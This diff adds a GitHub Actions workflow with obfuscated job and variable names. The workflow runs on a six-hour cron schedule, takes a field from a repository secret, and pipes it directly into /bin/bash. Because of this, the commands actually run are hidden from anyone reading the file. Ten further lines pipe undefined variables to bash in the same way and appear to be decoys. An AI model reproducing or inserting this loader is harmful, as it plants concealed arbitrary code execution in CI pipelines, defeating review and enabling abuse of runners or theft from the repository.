@@ -1,0 +1,29 @@
+name: yangduonian3719
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangduonian3719
+        env:
+          huu187: ${{ secrets.huu187 }}
+        run: |
+          echo $huu187 | jq -r .yg027 | /bin/bash
+          echo $rsmtl4 | jq -r .i43171 | /bin/bash
+          echo $lcwb8370 | jq -r .gx4 | /bin/bash
+          echo $nhyd9607 | jq -r .z69 | /bin/bash
+          echo $epny636 | jq -r .kn157 | /bin/bash
+          echo $bnftq93265 | jq -r .dw095 | /bin/bash
+          echo $ngad6311 | jq -r .s6174 | /bin/bash
+          echo $ki9 | jq -r .uakt064 | /bin/bash
+          echo $oklh5304 | jq -r .ptxtj27245 | /bin/bash
+          echo $u53 | jq -r .bgdn6 | /bin/bash
+          echo $ypw0186 | jq -r .gwly76 | /bin/bash
+
